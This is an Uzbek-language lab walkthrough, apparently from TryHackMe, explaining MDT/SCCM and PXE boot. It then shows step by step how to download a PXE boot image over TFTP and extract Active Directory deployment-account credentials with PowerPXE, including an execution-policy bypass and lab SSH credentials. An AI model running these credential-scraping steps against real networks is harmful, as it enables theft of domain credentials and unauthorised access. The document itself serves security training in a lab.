Katta tashkilotlar infratuzilmani tarqatish va boshqarish uchun vositalarga muhtoj bo‘ladi. Juda yirik tashkilotlarda IT xodimlari har bir kompyuterga DVD yoki hatto USB fleshkalar orqali dastur o‘rnatib yurishlari amalda mumkin emas. Yaxshiyamki, Microsoft bu kabi infratuzilmani boshqarish uchun kerakli vositalarni taqdim etadi. Biroq, ushbu vositalarda noto‘g‘ri sozlamalar bo‘lsa, ulardan Active Directory’ga hujum qilish uchun foydalanish mumkin.

### MDT va SCCM

**Microsoft Deployment Toolkit (MDT)** — bu Microsoft tomonidan taqdim etilgan xizmat bo‘lib, Windows operatsion tizimlarini avtomatlashtirilgan tarzda o‘rnatishda yordam beradi. Katta tashkilotlar bu kabi xizmatlardan foydalanib, yangi tizim tasvirlarini markazlashgan joyda saqlab va yangilab, ularni osonroq tarqatishadi.

Ko‘pincha MDT **Microsoft'ning System Center Configuration Manager (SCCM)** xizmati bilan integratsiyalashgan bo‘ladi. SCCM Microsoft dasturlari, xizmatlari va operatsion tizimlaridagi barcha yangilanishlarni boshqaradi. MDT yangi qurilmalarni sozlash uchun ishlatiladi. Ya’ni, IT jamoasi yuklash (boot) tasvirini oldindan sozlab qo‘yadi. Shunday qilib, yangi kompyuterni tayyorlash uchun faqat tarmoqqa ulanadigan kabelni ulash kifoya – o‘rnatish avtomatik tarzda boshlanadi. Ushbu boot tasviriga Office365 yoki tashkilot tanlagan antivirus kabi dasturlarni oldindan o‘rnatish mumkin. Shuningdek, o‘rnatish birinchi marta ishga tushirilganida tizim yangilanishlari ham avtomatik tarzda o‘rnatiladi.

**SCCM esa MDTning yanada kengaytirilgan va kuchliroq versiyasi hisoblanadi.** Dastur o‘rnatilgandan keyin nima bo‘ladi? Mana shu bosqichda SCCM ishga tushadi. U patch management – ya’ni dasturiy ta’minotdagi yangilanishlarni boshqarish bilan shug‘ullanadi. IT jamoasi mavjud yangilanishlarni ko‘rib chiqib, ularni oldindan sinov muhiti (sandbox)da tekshiradi va faqat barqaror deb topilgan yangilanishlarni barcha domenga ulangan qurilmalarga markazlashtirilgan tarzda tarqatadi. Bu IT jamoasining ishini sezilarli darajada yengillashtiradi.

Biroq, MDT va SCCM kabi infratuzilmani markazdan boshqarishga imkon beruvchi vositalar — noto‘g‘ri sozlangan taqdirda — hujumchilar uchun nishonga aylanishi mumkin. Chunki ular tashkilotdagi muhim funksiyalarni boshqaradi. Ushbu topshiriqda esa biz MDTning **PXE boot (Preboot Execution Environment)** deb nomlangan sozlamasi ustida to‘xtalamiz.


### PXE Boot (Preboot Execution Environment)

Katta tashkilotlar yangi qurilmalarni tarmoqqa ulanganda, ularning operatsion tizimini bevosita tarmoq orqali yuklab o‘rnatish imkonini beruvchi **PXE boot** texnologiyasidan foydalanishadi. **MDT (Microsoft Deployment Toolkit)** yordamida PXE boot tasvirlarini yaratish, boshqarish va ularni hosting qilish mumkin.

PXE boot odatda **DHCP** bilan integratsiyalashgan bo‘ladi. Ya’ni, agar DHCP qurilmaga IP manzil ajratsa, u holda ushbu qurilma (client) PXE boot tasvirini so‘rashi va tarmoq orqali OS o‘rnatishni boshlashi mumkin bo‘ladi. Bu jarayon quyidagi sxema orqali amalga oshiriladi:

1. Yangi qurilma tarmoqqa ulanadi.
2. DHCP unga IP manzil ajratadi va PXE server manzilini beradi.
3. Qurilma TFTP protokoli orqali PXE boot tasvirini yuklab oladi.
4. OS o‘rnatilishi avtomatik tarzda boshlanadi.

---

### PXE Boot tasviridan foydalanib hujum qilish

Biz ushbu **PXE boot tasviri orqali ikki xil maqsadda hujum** uyushtirishimiz mumkin:

1. **Imtiyozlarni oshirish vektori qo‘shish (Privilege Escalation)** – masalan, PXE tasviriga lokal administrator foydalanuvchisini qo‘shib, OS o‘rnatilgach tizimga to‘liq administrator huquqlari bilan kirish mumkin bo‘ladi.

2. **Parollarni yig‘ib olish hujumi (Password Scraping)** – OS o‘rnatilishi davomida ishlatilgan **Active Directory (AD)** hisob ma’lumotlarini, xususan, **MDT xizmatiga biriktirilgan deployment service account** foydalanuvchisini aniqlash va uning parolini olish mumkin.

---

### Ushbu topshiriqda

Biz **ikkinchi hujum usuliga** e’tibor qaratamiz — **password scraping**. Maqsadimiz: MDT xizmatidan foydalanilayotgan paytda tizimda ishlatilayotgan **deployment service account**'ning ma’lumotlarini aniqlash. Bundan tashqari, avtomatik tarzda ilovalar va xizmatlarni o‘rnatish jarayonida ishlatilayotgan boshqa **AD foydalanuvchi hisobi** (unattended installation accounts) ma’lumotlarini ham aniqlash ehtimoli mavjud.


### PXE Boot tasvirini yuklab olish (Retrieval) — O‘zbek tilida

**PXE Boot orqali hujum qilish uchun DHCP bosqichlarini o‘tkazib yuboramiz.** Ya’ni, biz IP manzil yoki PXE boot konfiguratsiyasi ma’lumotlarini DHCP orqali olish bosqichlarini bajarmaymiz — bu qadamni qo‘lda bajaramiz.

#### 1. **MDT server IP manzili**

Odatda, PXE Boot konfiguratsiyasida siz DHCP orqali quyidagi ma’lumotlarni olgan bo‘lardingiz:

* **MDT server IP manzili** — bu ma’lumotni siz **TryHackMe tarmoq diagrammasi** orqali topasiz.

#### 2. **BCD fayllari**

* BCD (Boot Configuration Data) fayllari turli arxitekturalar uchun PXE boot konfiguratsiyasini saqlaydi.
* BCD fayllar ro‘yxatini olish uchun quyidagi saytga tashrif buyuring:
  👉 `http://pxeboot.za.tryhackme.com`
* Fayllarning nomlari har kuni o‘zgaradi, shuning uchun siz o‘z faylingiz nomini **nusxalab saqlab qo‘ying.**
* Masalan: `x64{7B...B3}.bcd`

---

### SSH orqali TFTP yordamida BCD faylni olish:

1. SSH sessiyaga ulanishingiz kerak:

   ```bash
   ssh thm@THMJMP1.za.tryhackme.com
   Parol: Password1@
   ```

2. `Documents` katalogiga o‘ting va foydalanuvchi nomingizdagi papkani yarating:

   ```cmd
   cd Documents
   mkdir <username>
   copy C:\powerpxe <username>\
   cd <username>
   ```

3. TFTP orqali BCD faylni yuklab oling (IP manzilni oldin `nslookup` orqali toping):

   ```cmd
   nslookup thmmdt.za.tryhackme.com
   ```

   So‘ng:

   ```cmd
   tftp -i <THMMDT_IP> GET "\Tmp\x64{...}.bcd" conf.bcd
   ```

---

### PXE tasvir joylashuvini aniqlash:

1. PowerShell’ni ishga tushiring:

   ```cmd
   powershell -executionpolicy bypass
   Import-Module .\PowerPXE.ps1
   $BCDFile = "conf.bcd"
   Get-WimFile -bcdFile $BCDFile
   ```

   Bu sizga quyidagi kabi yo‘lni beradi:

   ```
   <PXE Boot Image Location>
   ```

---

### PXE Boot tasvirini yuklab olish:

```cmd
tftp -i <THMMDT_IP> GET "<PXE Boot Image Location>" pxeboot.wim
```

> Bu fayl katta bo‘lgani uchun (taxminan 300MB+), yuklab olish bir necha daqiqa davom etadi.

---

### PXE tasvirdan AD credential’larni ajratib olish

1. PowerPXE yordamida `pxeboot.wim` faylni tahlil qilib, undagi credential ma’lumotlarini ajratamiz:

   ```powershell
   Get-FindCredentials -WimFile pxeboot.wim
   ```

   Natijada quyidagiga o‘xshash chiqishi kerak:

   ```
   DeployRoot = \\THMMDT\MTDBuildLab$
   UserID = <hisob>
   UserDomain = ZA
   UserPassword = <parol>
   ```

> **Natija:** Endi sizda yangi AD credential’lar mavjud bo‘ladi. Ushbu hisoblar orqali Active Directory tizimiga kirish hujumlari amalga oshirilishi mumkin.
